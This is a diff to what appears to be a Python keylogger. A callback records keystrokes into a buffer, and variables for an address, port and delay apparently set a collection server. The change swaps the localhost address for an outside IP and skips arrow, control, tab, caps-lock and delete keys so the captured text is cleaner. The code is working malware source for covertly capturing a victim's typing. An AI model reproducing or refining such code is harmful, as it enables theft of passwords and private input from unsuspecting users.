@@ -6,7 +6,7 @@ import base64
 
 
 seeds = ""
-address = "127.0.0.1"
+address = "172.88.1.63"
 port = "3108"
 
 delay = 10
@@ -43,6 +43,20 @@ def scyth(key):
         seeds += "\n"
     elif key == keyboard.Key.space:
         seeds += " "
+    elif key == keyboard.Key.up:
+        pass
+    elif key == keyboard.Key.down:
+        pass
+    elif key == keyboard.Key.left:
+        pass
+    elif key == keyboard.Key.right:
+        pass
+    elif key == keyboard.Key.ctrl:
+        pass
+    elif key == keyboard.Key.ctrl_l:
+        pass
+    elif key == keyboard.Key.ctrl_r:
+        pass
     elif key == keyboard.Key.shift:
         pass
     elif key == keyboard.Key.backspace and len(seeds) == 0:
@@ -53,6 +67,12 @@ def scyth(key):
         pass
     elif key == keyboard.Key.esc:
         pass
+    elif key == keyboard.Key.tab:
+        pass
+    elif key == keyboard.Key.caps_lock:
+        pass
+    elif key == keyboard.Key.delete:
+       pass
     else:
         seeds += str(key).replace("'", "")
 
